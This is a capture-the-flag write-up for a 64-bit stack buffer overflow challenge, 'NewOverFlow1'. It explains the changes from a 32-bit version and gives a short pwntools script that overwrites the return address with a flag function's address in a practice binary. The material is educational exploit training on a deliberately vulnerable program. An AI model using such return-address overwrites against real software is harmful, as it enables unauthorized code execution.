# NewOverFlow1 - 200pt

### Challenge ###
> Lets try moving to 64-bit, but don't worry we'll start easy. Overflow the buffer and change the return address to the flag function in this program. You can find it in /problems/newoverflow-1_0_f9bdea7a6553786707a6d560decc5d50 on the shell server.

### Hints ###
> Now that we're in 64-bit, what used to be 4 bytes, now may be 8 bytes

### Solution ###
> To solve this challenge, we have to see how solve Overflow1. There are three differences:
1. flag address it's different
2. we have to use p64 and not p32
3. we not have ebp but rbp that is large 2 * ebp, so 8

### Executing the exploit ###
We can modify OverFlow1's exploit with: 

    garbage = "\x90" * (64 + 8)
    flag_addr = p64(0x0400767)

### Exploit: ###

    garbage = "\x90" * (64 + 8)
    flag_addr = p64(0x0400767)

    exploit = garbage + flag_addr

    p = process("./vuln")
    p.sendline(exploit)
    p.interactive()
